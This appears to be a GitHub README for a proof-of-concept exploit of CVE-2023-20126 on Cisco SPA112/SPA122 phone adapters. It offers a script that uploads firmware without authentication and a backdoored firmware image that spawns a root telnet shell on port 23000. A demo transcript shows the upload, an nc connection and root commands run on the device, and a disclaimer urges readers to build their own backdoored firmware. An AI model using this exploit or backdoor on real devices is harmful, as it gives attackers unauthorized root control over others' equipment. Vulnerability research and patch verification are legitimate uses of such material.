# RancidCrisco
Minimum Viable PoC for CVE-2023-20126

This is the initial release. It works, but its the 'simplest case' exploit.

Tested and working on SPA112/SPA122 - SPA232D requires a different firmware image. 

Gives a root-shell on port 23000/tcp.

I still need to clean up the toolchain used for editing the firmware and will probably put that in a different repo. It is mostly based on the work of @BigNerd95, but with minor alterations to work on the SPA112/122 firmware files.

## Demo.

```
$ python3 CVE-2023-20126.py http://192.168.0.152 CFW.bin 
Base URL: http://192.168.0.152
Firmware File: CFW.bin
Sending firmware update...
Firmware upgrade successful. Device will reboot eventually and be running the new FW.

< wait a few mins, nervously > 

$ nc -v 192.168.0.152 23000
Connection to 192.168.0.152 port 23000 [tcp/inovaport1] succeeded!
????????


BusyBox v1.10.2 (2019-10-14 12:41:41 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# id;uname -a;pwd
id;uname -a;pwd
uid=0(admin) gid=0(admin)
Linux SPA112 2.6.26.5 #1 PREEMPT Sun Sep 6 10:54:57 CST 2015 armv5tejl unknown
/
# cat /etc/version
cat /etc/version
router_major_version:1.4.1
router_minor_version:SR5
build_date:Mon Oct 14 12:48:12 CST 2019
build_version:6735
hardware_version:1.1.0
```

## Files

- fwupload.py - firmware image uploader that bypasses auth by simply not sending any, exploiting CVE-2023-20126. takes two arguments: URL of the devices Web UI, and firmware file to upload.
- telnet-23000.bin - Proof of Concept malicious firmware image that spawns `telnetd -l /bin/sh -p 23000`, giving a root shell on port 23000/tcp. Based on work by bignerd95.

## Licence
WTFPL.

## Bugs
use git issue. 

## Disclaimer
If this bricks your fucking device, I don't take any responsibility.   
That is YOUR problem.  
I mean, I hacked together that backdoored firmware in an evening.  
Also, why aren't you following the writeup and building your own backdoored firmware?  
